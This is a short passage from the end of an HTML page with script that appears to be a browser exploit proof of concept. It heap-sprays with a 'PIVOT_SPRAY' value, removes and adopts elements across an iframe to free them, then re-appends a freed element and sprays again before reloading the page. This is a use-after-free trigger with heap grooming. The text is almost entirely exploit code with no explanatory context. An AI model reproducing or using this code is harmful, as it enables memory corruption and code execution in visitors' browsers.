	for(var i=0;i<0x300;i++) spray(0x4c, 1, PIVOT_SPRAY);
}

function removeElements()
{ 
    iframe.contentDocument.body.removeChild(element1);
    document.adoptNode(element1);

    iframe.contentDocument.body.removeChild(element2);
    document.adoptNode(element2);  

    document.body.removeChild(iframe);
    setTimeout(finishTest, 500);
}

function finishTest()
{  
    document.body.appendChild(element1);
    heapspray();
    setTimeout(function () { location.reload() }, 0);
}

</script>
</html>
